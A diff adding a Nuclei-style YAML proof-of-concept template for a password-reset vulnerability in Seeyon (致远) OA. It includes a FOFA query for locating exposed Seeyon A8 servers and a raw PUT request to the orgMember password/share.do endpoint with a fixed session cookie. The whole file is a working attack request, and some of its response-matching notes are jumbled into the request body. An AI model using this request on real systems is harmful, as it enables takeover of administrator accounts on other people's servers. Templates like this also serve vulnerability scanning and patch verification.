@@ -1,0 +1,49 @@
+id: poc-nxffynl61fp2olvi
+info:
+  name: 致远OA ucpcLogin 密码重置漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nxffynl61fp2olvi'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nxffynl61fp2olvi
+    fofa: app="致远A8"
+http:
+- raw:
+  - 'PUT /seeyon/rest/orgMember/-4401606663639775639/password/share.do HTTP/1.1
+
+
+    Accept: */*
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Connection: close
+
+
+    Cookie: JSESSIONID=3891CB3E3CA435C599001E4F03A335B0; loginPageURL=
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?(?:orgAccountId|管理员)).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
